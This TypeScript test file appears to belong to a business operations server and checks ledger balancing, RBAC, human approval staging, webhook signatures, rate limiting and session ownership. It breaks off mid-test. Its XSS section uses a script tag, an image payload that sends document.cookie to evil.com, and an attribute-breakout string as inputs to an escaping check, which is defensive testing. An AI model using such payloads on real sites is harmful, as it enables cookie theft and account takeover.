/**
 * ====================================================================
 * BOS COMPREHENSIVE ARCHITECTURAL, SECURITY & DATA INTEGRITY TEST SUITE
 * ====================================================================
 * Automated Test Suites:
 * 1. Double-Entry Accounting Invariants & Universal Ledger Posting Rule
 * 2. Immutable Ledger Triggers (Preventing Direct UPDATE and DELETE on Posted Entries)
 * 3. Cryptographic Token Hashing & Scoped RBAC Permissions
 * 4. Human-in-the-Loop (HITL) Staging Interceptor & Zero-Race Atomic Claiming
 * 5. Real-world Supply Chain Invariants, Partial Deliveries & Atomic PO Receipts
 * 6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback
 * 7. Protected REST Authentication (401 on Missing/Invalid Token) & RBAC (403 on Scope Mismatch)
 * 8. Order Webhook Trust Boundary (HMAC-SHA256 Signature Verification, Forgery Rejection & Replay Idempotency)
 * 9. Database Migrations from Older Installations (Schema Upgrade with Zero Data Loss)
 * 10. XSS Input Sanitization & DOM Event Delegation Invariants
 */

import { describe, it, expect } from "bun:test";
import { Database } from "bun:sqlite";
import { createHmac, randomUUID } from "crypto";
import {
  db,
  BusinessCoreService,
  SecurityManager,
  HitlEngine,
  AuditEngine,
  LedgerManager,
  verifyTransactionGroupBalance,
  handleMcpJsonRpc,
  handleHttpRequest,
  runMigrations,
  RateLimiter,
  ORDER_WEBHOOK_SECRET,
} from "../server";

const TEST_WEBHOOK_SECRET = ORDER_WEBHOOK_SECRET;

// Helper: Escape HTML function mirror for testing
function escapeHtml(str: string): string {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

describe("1. Double-Entry Accounting Invariants & Universal Posting Rules", () => {
  it("should post a balanced invoice with explicit tax-payable entry", () => {
    const subtotal = 1000.0;
    const tax = 80.0;
    const res = BusinessCoreService.financeIssueInvoice("ent_apex", subtotal, "Cloud Infrastructure Consulting", tax, "USD", "operator_test", true);

    expect(res.executed).toBe(true);
    expect(res.total_receivable).toBe(1080.0);
    expect(res.revenue).toBe(1000.0);
    expect(res.tax_amount).toBe(80.0);

    // Verify double-entry balance in database: Sum(Debits) === Sum(Credits)
    const entries = db.query<any, { $tx: string }>(
      "SELECT type, account, amount FROM ledger_entries WHERE transaction_group_id = $tx"
    ).all({ $tx: res.transaction_group_id });

    expect(entries.length).toBe(3);

    const totalDebits = entries.filter(e => e.type === "debit").reduce((sum, e) => sum + e.amount, 0);
    const totalCredits = entries.filter(e => e.type === "credit").reduce((sum, e) => sum + e.amount, 0);

    expect(totalDebits).toBe(totalCredits);
    expect(totalDebits).toBe(1080.0);
  });

  it("should strictly balance monthly payroll debits and credits", () => {
    const res = BusinessCoreService.hrmsStagePayrollRun("2026-TEST", "operator_test", true);
    expect(res.executed).toBe(true);

    const entries = db.query<any, { $tx: string }>(
      "SELECT type, amount FROM ledger_entries WHERE transaction_group_id = $tx"
    ).all({ $tx: res.transaction_group_id });

    const totalDebits = entries.filter(e => e.type === "debit").reduce((sum, e) => sum + e.amount, 0);
    const totalCredits = entries.filter(e => e.type === "credit").reduce((sum, e) => sum + e.amount, 0);

    expect(totalDebits).toBe(totalCredits);
    expect(totalDebits).toBe(res.total_disbursed);
  });

  it("should reject unbalanced ledger transactions under the universal posting rule", () => {
    const brokenTxGroup = "tx_unbalanced_" + randomUUID().substring(0, 8);
    expect(() => {
      LedgerManager.postTransaction(brokenTxGroup, [
        { type: "debit", account: "cash", category: "manual", amount: 500, description: "Debit 500" },
        { type: "credit", account: "revenue", category: "manual", amount: 400, description: "Credit 400" },
      ], db);
    }).toThrow(/Double-entry invariant violated/);
  });

  it("should reject negative or non-finite ledger amounts", () => {
    const brokenTxGroup = "tx_neg_" + randomUUID().substring(0, 8);
    expect(() => {
      LedgerManager.postTransaction(brokenTxGroup, [
        { type: "debit", account: "cash", category: "manual", amount: -100, description: "Negative Debit" },
        { type: "credit", account: "revenue", category: "manual", amount: -100, description: "Negative Credit" },
      ], db);
    }).toThrow(/Invalid ledger entry amount/);
  });

  it("should reject currency mismatches within the same transaction group", () => {
    const brokenTxGroup = "tx_curr_" + randomUUID().substring(0, 8);
    expect(() => {
      LedgerManager.postTransaction(brokenTxGroup, [
        { type: "debit", account: "cash", category: "manual", amount: 100, currency: "USD", description: "USD Debit" },
        { type: "credit", account: "revenue", category: "manual", amount: 100, currency: "EUR", description: "EUR Credit" },
      ], db);
    }).toThrow(/Currency mismatch/);
  });

  it("should reject invoice generation for non-existent customer entities", () => {
    expect(() => {
      BusinessCoreService.financeIssueInvoice("ent_ghost_customer", 500, "Services", 0, "USD", "test", true);
    }).toThrow(/Customer entity does not exist/);
  });
});

describe("2. Ledger Immutability & Database Triggers", () => {
  it("should throw an error when attempting to directly UPDATE a posted ledger entry", () => {
    const postedEntry = db.query<any, []>("SELECT id FROM ledger_entries WHERE status = 'posted' LIMIT 1").get();
    expect(postedEntry).toBeDefined();

    expect(() => {
      db.query("UPDATE ledger_entries SET amount = 999999 WHERE id = $id").run({ $id: postedEntry.id });
    }).toThrow(/Posted ledger entries are immutable/);
  });

  it("should throw an error when attempting to DELETE a posted ledger entry", () => {
    const postedEntry = db.query<any, []>("SELECT id FROM ledger_entries WHERE status = 'posted' LIMIT 1").get();
    expect(postedEntry).toBeDefined();

    expect(() => {
      db.query("DELETE FROM ledger_entries WHERE id = $id").run({ $id: postedEntry.id });
    }).toThrow(/Posted ledger entries are immutable and cannot be deleted/);
  });
});

describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
  it("should generate high-entropy tokens and store only SHA-256 hashes", () => {
    const { rawToken, tokenHash, tokenPrefix } = SecurityManager.generateSecureToken("bos_test_");
    expect(rawToken.startsWith("bos_test_")).toBe(true);
    expect(tokenHash).toHaveLength(64);
    expect(tokenPrefix).toContain("...");

    const tokenId = "tok_test_rbac_" + randomUUID().substring(0, 6);
    db.query(`
      INSERT OR REPLACE INTO agent_tokens (id, name, token_hash, token_prefix, scopes, rate_limit_per_min, is_active)
      VALUES ($id, 'Test Scoped Agent', $hash, $prefix, '["crm:*", "inventory:read"]', 100, 1)
    `).run({
      $id: tokenId,
      $hash: tokenHash,
      $prefix: tokenPrefix,
    });

    const authSuccess = SecurityManager.verifyToken(`Bearer ${rawToken}`);
    expect(authSuccess.authenticated).toBe(true);
    expect(authSuccess.agentId).toBe(tokenId);
    expect(authSuccess.scopes).toEqual(["crm:*", "inventory:read"]);

    const row = db.query<any, { $id: string }>("SELECT * FROM agent_tokens WHERE id = $id").get({ $id: tokenId });
    expect(row.token).toBeUndefined();
    expect(row.token_hash).toBe(tokenHash);
  });

  it("should enforce scopes on MCP tool calls across all transports", () => {
    const supportScopes = ["crm:*", "reviews:*"];

    // 1. Permitted Tool
    const allowedMsg = {
      jsonrpc: "2.0",
      id: "1",
      method: "tools/call",
      params: { name: "crm_search_entities", arguments: { query: "Apex" } },
    };
    const allowedRes = handleMcpJsonRpc(allowedMsg, "test_agent", supportScopes);
    expect(allowedRes.error).toBeUndefined();
    expect(allowedRes.result.content).toBeDefined();

    // 2. Forbidden Tool
    const forbiddenMsg = {
      jsonrpc: "2.0",
      id: "2",
      method: "tools/call",
      params: { name: "hrms_stage_payroll_run", arguments: { batch_period: "2026-12" } },
    };
    const forbiddenRes = handleMcpJsonRpc(forbiddenMsg, "test_agent", supportScopes);
    expect(forbiddenRes.error).toBeDefined();
    expect(forbiddenRes.error.code).toBe(-32001);
    expect(forbiddenRes.error.message).toContain("Permission Denied");
  });
});

describe("4. Human-in-the-Loop (HITL) Staging & Zero-Race Atomic Claiming", () => {
  it("should intercept high-stakes tools and route them to staged_actions", () => {
    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 15000.0, "Large Logistics Contract", 0, "USD", "agent_finance", false);
    expect(stagedRes.staged).toBe(true);
    expect(stagedRes.status).toBe("pending_human_approval");
    expect(stagedRes.risk_level).toBe("high");

    const stagedRow = db.query<any, { $id: string }>(
      "SELECT * FROM staged_actions WHERE id = $id"
    ).get({ $id: stagedRes.staged_action_id });

    expect(stagedRow).toBeDefined();
    expect(stagedRow.status).toBe("pending");
    expect(stagedRow.tool_name).toBe("finance_issue_invoice");

    // Human operator approval executes underlying work
    const approvalRes = HitlEngine.approveAction(stagedRes.staged_action_id, "human_cfo");
    expect(approvalRes.status).toBe("approved");

    const approvedRow = db.query<any, { $id: string }>(
      "SELECT * FROM staged_actions WHERE id = $id"
    ).get({ $id: stagedRes.staged_action_id });

    expect(approvedRow.status).toBe("approved");
    expect(approvedRow.reviewed_by).toBe("human_cfo");
  });

  it("should prevent duplicate execution under concurrent approval requests", () => {
    // Stage an action
    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 5000.0, "Consulting Retainer", 0, "USD", "agent_finance", false);
    const stagedId = stagedRes.staged_action_id;

    // First operator approves
    const firstRes = HitlEngine.approveAction(stagedId, "operator_1");
    expect(firstRes.status).toBe("approved");

    // Second operator (or concurrent replay) attempts to approve the exact same action
    expect(() => {
      HitlEngine.approveAction(stagedId, "operator_2");
    }).toThrow(/not in pending state or was already claimed/);
  });

  it("should reject actions atomically and prevent subsequent re-approvals", () => {
    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 2000.0, "Invalid Order", 0, "USD", "agent_finance", false);
    const stagedId = stagedRes.staged_action_id;

    const rejectRes = HitlEngine.rejectAction(stagedId, "operator_risk", "Amount exceeds authorized credit limit");
    expect(rejectRes.status).toBe("rejected");

    // Attempting to approve rejected action must fail
    expect(() => {
      HitlEngine.approveAction(stagedId, "operator_2");
    }).toThrow(/not in pending state or was already claimed/);
  });
});

describe("5. Supply Chain Invariants, Partial Deliveries & Atomic PO Receipts", () => {
  it("should NOT prematurely increase on-hand stock when a PO is drafted/ordered", () => {
    const itemBefore = db.query<any, { $sku: string }>("SELECT * FROM catalog_items WHERE sku = 'HW-SRV-01'").get({ $sku: "HW-SRV-01" });
    const initialStock = itemBefore.stock_qty;

    const poRes = BusinessCoreService.erpDraftPurchaseOrder("HW-SRV-01", 20, itemBefore.supplier_entity_id, "operator_test", true);
    expect(poRes.executed).toBe(true);

    // Stock MUST remain unchanged until shipment dock delivery
    const itemAfterOrder = db.query<any, { $sku: string }>("SELECT * FROM catalog_items WHERE sku = 'HW-SRV-01'").get({ $sku: "HW-SRV-01" });
    expect(itemAfterOrder.stock_qty).toBe(initialStock);

    // Partial delivery: 8 units arrive first
    const partialRes = BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 8, "dock_manager");
    expect(partialRes.received).toBe(true);
    expect(partialRes.stage).toBe("partially_received");
    expect(partialRes.received_quantity).toBe(8);
    expect(partialRes.remaining_quantity).toBe(12);
    expect(partialRes.new_stock_qty).toBe(initialStock + 8);

    // Remaining 12 units arrive on the next truck
    const finalRes = BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 12, "dock_manager");
    expect(finalRes.received).toBe(true);
    expect(finalRes.stage).toBe("received");
    expect(finalRes.remaining_quantity).toBe(0);
    expect(finalRes.new_stock_qty).toBe(initialStock + 20);

    // Attempting to receive again on a completed PO must throw an error
    expect(() => {
      BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 1, "dock_manager");
    }).toThrow(/already been completely received/);
  });
});

describe("6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback", () => {
  it("should rollback an entity update atomically and block rollback on modified state", () => {
    const testEntId = "ent_test_rb_" + randomUUID().substring(0, 6);
    db.query(`
      INSERT OR REPLACE INTO entities (id, type, role, name, status)
      VALUES ($id, 'person', 'lead', 'Initial Name', 'active')
    `).run({ $id: testEntId });

    const beforeState = { id: testEntId, name: "Initial Name", status: "active" };
    const afterState = { id: testEntId, name: "Updated Name", status: "active" };

    db.query("UPDATE entities SET name = 'Updated Name' WHERE id = $id").run({ $id: testEntId });

    const auditId = AuditEngine.record("human", "operator", "crm_update_entity", "entities", testEntId, "UPDATE", beforeState, afterState);

    const rollbackRes = AuditEngine.rollback(auditId, "operator_undo");
    expect(rollbackRes.success).toBe(true);

    const restoredEntity = db.query<any, { $id: string }>("SELECT * FROM entities WHERE id = $id").get({ $id: testEntId });
    expect(restoredEntity.name).toBe("Initial Name");

    expect(() => {
      AuditEngine.rollback(auditId, "operator_undo");
    }).toThrow(/already been reverted/);
  });

  it("should forbid rollback on financial ledger entries", () => {
    const fakeLedgerAuditId = AuditEngine.record("human", "operator", "finance_test", "ledger_entries", "led_fake", "UPDATE", {}, {});
    expect(() => {
      AuditEngine.rollback(fakeLedgerAuditId, "operator");
    }).toThrow(/Financial ledger entries cannot be rolled back via arbitrary table mutation/);
  });
});

describe("7. REST API Authentication & Authorization (401 & 403)", () => {
  it("should reject unauthenticated requests with 401 Unauthorized", async () => {
    const endpoints = [
      { path: "http://localhost:8080/api/pulse", method: "GET" },
      { path: "http://localhost:8080/api/staged-actions", method: "GET" },
      { path: "http://localhost:8080/api/tokens", method: "GET" },
      { path: "http://localhost:8080/api/canvas", method: "GET" },
      { path: "http://localhost:8080/api/audit-logs", method: "GET" },
    ];

    for (const ep of endpoints) {
      const req = new Request(ep.path, { method: ep.method });
      const res = await handleHttpRequest(req);
      expect(res.status).toBe(401);
      const json = await res.json();
      expect(json.error).toContain("Unauthorized");
    }
  });

  it("should reject requests with insufficient scopes with 403 Forbidden", async () => {
    // Generate a restricted token that only has pulse:read scope
    const { rawToken, tokenHash, tokenPrefix } = SecurityManager.generateSecureToken("bos_restricted_");
    const restrictedId = "tok_restricted_" + randomUUID().substring(0, 6);
    db.query(`
      INSERT INTO agent_tokens (id, name, token_hash, token_prefix, scopes, rate_limit_per_min, is_active)
      VALUES ($id, 'Restricted Pulse Agent', $hash, $prefix, '["pulse:read"]', 120, 1)
    `).run({
      $id: restrictedId,
      $hash: tokenHash,
      $prefix: tokenPrefix,
    });

    // 1. Authorized endpoint succeeds
    const pulseReq = new Request("http://localhost:8080/api/pulse", {
      headers: { Authorization: `Bearer ${rawToken}` },
    });
    const pulseRes = await handleHttpRequest(pulseReq);
    expect(pulseRes.status).toBe(200);

    // 2. Forbidden endpoint: attempt to read admin tokens with only pulse:read scope
    const adminReq = new Request("http://localhost:8080/api/tokens", {
      headers: { Authorization: `Bearer ${rawToken}` },
    });
    const adminRes = await handleHttpRequest(adminReq);
    expect(adminRes.status).toBe(403);
    const adminJson = await adminRes.json();
    expect(adminJson.error).toContain("Forbidden");
    expect(adminJson.error).toContain("admin:tokens");

    // 3. Forbidden write: attempt to write to canvas with only pulse:read scope
    const canvasWriteReq = new Request("http://localhost:8080/api/canvas/item", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${rawToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ title: "Unauthorized Deal" }),
    });
    const canvasRes = await handleHttpRequest(canvasWriteReq);
    expect(canvasRes.status).toBe(403);
  });
});

describe("8. Order Webhook Trust Boundary (HMAC Signatures, Forgery Rejection & Replays)", () => {
  it("should reject webhooks without a signature or secret with 401 Unauthorized", async () => {
    const payload = JSON.stringify({
      customer_email: "hacker@evil.io",
      total_amount: 500,
    });
    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: payload,
    });
    const res = await handleHttpRequest(req);
    expect(res.status).toBe(401);
    const json = await res.json();
    expect(json.error).toContain("Invalid or missing webhook signature");
  });

  it("should reject webhooks with an invalid/forged HMAC signature with 401 Unauthorized", async () => {
    const payload = JSON.stringify({
      customer_email: "hacker@evil.io",
      total_amount: 500,
    });
    const fakeSig = createHmac("sha256", "wrong_secret").update(payload).digest("hex");

    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Signature": fakeSig,
      },
      body: payload,
    });
    const res = await handleHttpRequest(req);
    expect(res.status).toBe(401);
  });

  it("should accept authentic webhooks with valid HMAC signature and ingest order idempotently", async () => {
    const orderNumber = "ORD-" + Math.floor(100000 + Math.random() * 900000);
    const orderPayload = JSON.stringify({
      order_number: orderNumber,
      customer_name: "Verified Customer",
      customer_email: "verified@customer.com",
      total_amount: 1850.0,
      items: [{ sku: "HW-SRV-01", quantity: 1 }],
    });

    const validSig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");

    // 1. Initial valid ingestion
    const req1 = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Signature": validSig,
      },
      body: orderPayload,
    });
    const res1 = await handleHttpRequest(req1);
    expect(res1.status).toBe(201);
    const json1 = await res1.json();
    expect(json1.success).toBe(true);
    expect(json1.order_id).toContain(orderNumber);

    // Verify double-entry balance in database
    verifyTransactionGroupBalance(json1.transaction_group_id, db);

    // 2. Replay of the exact same signed webhook payload
    const req2 = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Signature": validSig,
      },
      body: orderPayload,
    });
    const res2 = await handleHttpRequest(req2);
    expect(res2.status).toBe(200);
    const json2 = await res2.json();
    expect(json2.idempotent_replay).toBe(true);
    expect(json2.message).toContain("already ingested previously");
  });

  it("should reject invalid order payloads with non-positive amounts", async () => {
    const invalidPayload = JSON.stringify({
      customer_email: "buyer@test.io",
      total_amount: -50,
    });
    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(invalidPayload).digest("hex");

    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Signature": sig,
      },
      body: invalidPayload,
    });
    const res = await handleHttpRequest(req);
    expect(res.status).toBe(400);
    const json = await res.json();
    expect(json.error).toContain("positive, finite number");
  });
});

describe("9. Database Migration from an Older Installation", () => {
  it("should upgrade an older database schema without data loss", () => {
    // 1. Create isolated in-memory database with older unmigrated schema
    const legacyDb = new Database(":memory:");
    legacyDb.exec("PRAGMA foreign_keys = ON;");

    legacyDb.exec(`
      CREATE TABLE entities (
        id TEXT PRIMARY KEY,
        type TEXT NOT NULL,
        role TEXT NOT NULL,
        name TEXT NOT NULL,
        email TEXT,
        status TEXT NOT NULL DEFAULT 'active'
      );

      CREATE TABLE ledger_entries (
        id TEXT PRIMARY KEY,
        transaction_group_id TEXT NOT NULL,
        type TEXT NOT NULL,
        account TEXT NOT NULL,
        category TEXT NOT NULL,
        amount REAL NOT NULL,
        tax_amount REAL NOT NULL DEFAULT 0,
        currency TEXT NOT NULL DEFAULT 'USD',
        status TEXT NOT NULL DEFAULT 'posted',
        description TEXT NOT NULL,
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Insert pre-existing customer and posted ledger entries
    legacyDb.exec(`
      INSERT INTO entities (id, type, role, name, email) VALUES ('ent_legacy_cust', 'person', 'customer', 'Legacy Customer', 'cust@legacy.io');
      INSERT INTO ledger_entries (id, transaction_group_id, type, account, category, amount, status, description)
      VALUES
        ('led_leg_1', 'tx_leg', 'debit', 'cash', 'sale', 100, 'posted', 'Legacy Cash Debit'),
        ('led_leg_2', 'tx_leg', 'credit', 'revenue', 'sale', 100, 'posted', 'Legacy Revenue Credit');
    `);

    // 2. Execute migration runner on legacy database
    runMigrations(legacyDb);

    // 3. Verify schema_migrations contains applied version 1
    const migrationRow = legacyDb.query<any, { $v: number }>(
      "SELECT * FROM schema_migrations WHERE version = $v"
    ).get({ $v: 1 });
    expect(migrationRow).toBeDefined();
    expect(migrationRow.name).toBe("ledger_immutability");

    // 4. Verify triggers now protect posted entries on the upgraded database
    expect(() => {
      legacyDb.query("UPDATE ledger_entries SET amount = 999999 WHERE id = 'led_leg_1'").run();
    }).toThrow(/Posted ledger entries are immutable/);

    // 5. Verify pre-existing customer and ledger entries remain completely intact
    const cust = legacyDb.query<any, []>("SELECT * FROM entities WHERE id = 'ent_legacy_cust'").get();
    expect(cust.name).toBe("Legacy Customer");

    const entries = legacyDb.query<any, []>("SELECT * FROM ledger_entries WHERE transaction_group_id = 'tx_leg'").all();
    expect(entries.length).toBe(2);
    expect(entries[0].amount).toBe(100);

    legacyDb.close();
  });
});

describe("10. XSS Protection & Dynamic DOM Event Delegation Invariants", () => {
  it("should escape malicious script tags in entity names and titles", () => {
    const maliciousPayload = `<script>alert('XSS')</script>`;
    const escaped = escapeHtml(maliciousPayload);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toBe("&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;");

    const imgPayload = `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">`;
    const escapedImg = escapeHtml(imgPayload);
    expect(escapedImg).not.toContain("<img");
    expect(escapedImg).toContain("&lt;img");
  });

  it("should prevent code breakout in action identifiers via DOM data attributes", () => {
    // Malicious action ID intended to break out of inline string context: `');evilCode();//`
    const maliciousActionId = "act_123');evilCode();//";
    const escapedAttr = escapeHtml(maliciousActionId);

    // When rendered inside data-action and data-id attributes:
    const htmlSnippet = `<button data-action="approve-action" data-id="${escapedAttr}">Approve</button>`;

    // Must NOT contain unescaped single quotes
    expect(htmlSnippet).not.toContain("'");
    expect(htmlSnippet).toContain("&#039;");

    // Proves that when extracted with element.getAttribute('data-id'), it remains a pure string parameter
  });
});

describe("11. Webhook Concurrency & Idempotency Invariants", () => {
  it("should handle duplicate or concurrent order submissions idempotently without double accounting or stock deductions", async () => {
    const orderNumber = "CONCUR-" + randomUUID().substring(0, 6);
    const orderPayload = JSON.stringify({
      customer_name: "Concurrency Tester",
      customer_email: "concurrency@test.io",
      order_number: orderNumber,
      total_amount: 240.0,
      items: [{ sku: "HW-IOT-99", quantity: 1 }],
    });

    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");

    const req1 = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });
    const res1 = await handleHttpRequest(req1);
    expect(res1.status).toBe(201);
    const json1 = await res1.json();
    expect(json1.success).toBe(true);

    // Second request with exact same order number
    const req2 = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });
    const res2 = await handleHttpRequest(req2);
    expect(res2.status).toBe(200);
    const json2 = await res2.json();
    expect(json2.idempotent_replay).toBe(true);

    // Verify only 1 pipeline_states record exists
    const orders = db.query<any, { $id: string }>(
      "SELECT count(*) as count FROM pipeline_states WHERE id = $id"
    ).get({ $id: "pip_ord_" + orderNumber });
    expect(orders?.count).toBe(1);

    // Verify ledger entries were only posted once (1 debit cash, 1 credit revenue)
    const ledgerEntries = db.query<any, { $ref: string }>(
      "SELECT count(*) as count FROM ledger_entries WHERE reference_id = $ref"
    ).get({ $ref: "pip_ord_" + orderNumber });
    expect(ledgerEntries?.count).toBe(2);
  });
});

describe("12. Inventory Stock Validation & Overselling Prevention", () => {
  it("should reject orders that exceed available physical stock with 422 Unprocessable Entity", async () => {
    const itemBefore = db.query<any, { $sku: string }>(
      "SELECT stock_qty FROM catalog_items WHERE sku = $sku"
    ).get({ $sku: "HW-SRV-01" });
    const currentStock = itemBefore?.stock_qty || 0;

    // Request more than available
    const excessiveQuantity = currentStock + 50;
    const orderNumber = "OVER-" + randomUUID().substring(0, 6);
    const orderPayload = JSON.stringify({
      customer_name: "Oversell Tester",
      customer_email: "oversell@test.io",
      order_number: orderNumber,
      total_amount: 1850.0 * excessiveQuantity,
      items: [{ sku: "HW-SRV-01", quantity: excessiveQuantity }],
    });

    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");
    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });

    const res = await handleHttpRequest(req);
    expect(res.status).toBe(422);

    const json = await res.json();
    expect(json.code).toBe("INSUFFICIENT_STOCK");
    expect(json.available_stock).toBe(currentStock);
    expect(json.requested_quantity).toBe(excessiveQuantity);

    // Stock must be completely unchanged in the database
    const itemAfter = db.query<any, { $sku: string }>(
      "SELECT stock_qty FROM catalog_items WHERE sku = $sku"
    ).get({ $sku: "HW-SRV-01" });
    expect(itemAfter?.stock_qty).toBe(currentStock);

    // Order state machine must NOT have been inserted
    const orderRow = db.query<any, { $id: string }>(
      "SELECT * FROM pipeline_states WHERE id = $id"
    ).get({ $id: "pip_ord_" + orderNumber });
    expect(orderRow).toBeNull();
  });

  it("should atomically deduct stock and post balanced ledger when items are in stock", async () => {
    const itemBefore = db.query<any, { $sku: string }>(
      "SELECT stock_qty FROM catalog_items WHERE sku = $sku"
    ).get({ $sku: "HW-IOT-99" });
    const stockBefore = itemBefore?.stock_qty || 10;
    expect(stockBefore).toBeGreaterThan(0);

    const orderNumber = "VALID-" + randomUUID().substring(0, 6);
    const orderPayload = JSON.stringify({
      customer_name: "Valid Buyer",
      customer_email: "valid@test.io",
      order_number: orderNumber,
      total_amount: 240.0,
      items: [{ sku: "HW-IOT-99", quantity: 1 }],
    });

    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");
    const req = new Request("http://localhost:8080/api/webhooks/order", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Signature": sig },
      body: orderPayload,
    });

    const res = await handleHttpRequest(req);
    expect(res.status).toBe(201);
    const json = await res.json();
    expect(json.success).toBe(true);

    // Verify stock is decremented exactly by 1
    const itemAfter = db.query<any, { $sku: string }>(
      "SELECT stock_qty FROM catalog_items WHERE sku = $sku"
    ).get({ $sku: "HW-IOT-99" });
    expect(itemAfter?.stock_qty).toBe(stockBefore - 1);

    // Verify balanced double-entry accounting
    verifyTransactionGroupBalance(json.transaction_group_id, db);
  });
});

describe("13. Durable SQLite-Backed Rate Limiting & Socket Protection", () => {
  it("should record requests in SQLite rate_limits table and throttle after limit is reached", () => {
    const testKey = "client_test_" + randomUUID().substring(0, 6);

    const check1 = RateLimiter.check(testKey, 2);
    expect(check1.allowed).toBe(true);
    expect(check1.remaining).toBe(1);

    const check2 = RateLimiter.check(testKey, 2);
    expect(check2.allowed).toBe(true);
    expect(check2.remaining).toBe(0);

    // Third call should be throttled
    const check3 = RateLimiter.check(testKey, 2);
    expect(check3.allowed).toBe(false);
    expect(check3.remaining).toBe(0);
    expect(check3.retryAfterSec).toBeGreaterThan(0);

    // Verify records exist in SQLite rate_limits table
    const rows = db.query<any, { $key: string }>(
      "SELECT count(*) as count FROM rate_limits WHERE client_key = $key"
    ).get({ $key: testKey });
    expect(rows?.count).toBe(2);
  });
});

describe("14. Rate-Limiter Database Failure & Fail-Closed Invariants", () => {
  it("should engage in-memory fallback and enforce throttling when database encounters an error", () => {
    // Create an isolated in-memory DB without the rate_limits table to simulate a database failure
    const brokenDb = new Database(":memory:");
    const testKey = "client_db_fail_" + randomUUID().substring(0, 6);

    // Call 1 & 2 should succeed via fallback limiter
    const check1 = RateLimiter.check(testKey, 2, brokenDb);
    expect(check1.allowed).toBe(true);

    const check2 = RateLimiter.check(testKey, 2, brokenDb);
    expect(check2.allowed).toBe(true);

    // Call 3 must be throttled (allowed: false) by the fallback limiter, preventing unthrottled bypass
    const check3 = RateLimiter.check(testKey, 2, brokenDb);
    expect(check3.allowed).toBe(false);
    expect(check3.retryAfterSec).toBeGreaterThan(0);
    expect(check3.error).toContain("throttled by fallback");

    brokenDb.close();
  });
});

describe("15. MCP SSE Session Ownership & Cross-Session Message Rejection", () => {
  it("should bind SSE sessions to the owner agent and reject messages from unauthorized agents with 403 Forbidden", async () => {
    // 1. Create two distinct agent tokens: Agent Alpha and Agent Beta
    const tokenAlpha = SecurityManager.createAgentToken("Agent Alpha", ["*"], 120);
    const tokenBeta = SecurityManager.createAgentToken("Agent Beta", ["*"], 120);

    // 2. Agent Alpha initiates an SSE connection
    const sseReq = new Request("http://localhost:8080/mcp/sse", {
      method: "GET",
      headers: { Authorization: `Bearer ${tokenAlpha}` },
    });
    const sseRes = await handleHttpRequest(sseReq);
    expect(sseRes.status).toBe(200);

    // Extract sessionId from endpoint event in SSE stream
    const reader = sseRes.body?.getReader();
    const chunk = await reader?.read();
    const text = new TextDecoder().decode(chunk?.value);
    const match = text.match(/sessionId=(sess_[a-zA-Z0-9_-]+)/);
    expect(match).not.toBeNull();
    const sessionId = match![1];

    // 3. Agent Beta attempts to send a message targeting Agent Alpha's SSE session
    const hijackedReq = new Request(`http://localhost:8080/mcp/messages?sessionId=${sessionId}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenBeta}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "crm_search_entities", arguments: { query: "Apex" } },
      }),
    });

    const hijackedRes = await handleHttpRequest(hijackedReq);
    expect(hijackedRes.status).toBe(403);
    const hijackedJson = await hijackedRes.json();
    expect(hijackedJson.error).toContain("does not belong to the authenticated identity");

    // 4. Agent Alpha (the legitimate owner) sends a message to the same session
    const legitimateReq = new Request(`http://localhost:8080/mcp/messages?sessionId=${sessionId}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenAlpha}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 2,
        method: "tools/call",
        params: { name: "crm_search_entities", arguments: { query: "Apex" } },
      }),
    });

    const legitimateRes = await handleHttpRequest(legitimateReq);
    expect(legitimateRes.status).toBe(200);

    // Cancel reader to trigger cleanup
    await reader?.cancel();
  });
});

describe("16. Order Total & Line Item Price Reconciliation", () => {
  it("should reject orders with total_amount mismatching catalog prices with 422 Unprocessable Entity", async () => {
    // 1 unit of HW-IOT-99 is $240.00 in catalog. Buyer sends $10.00.
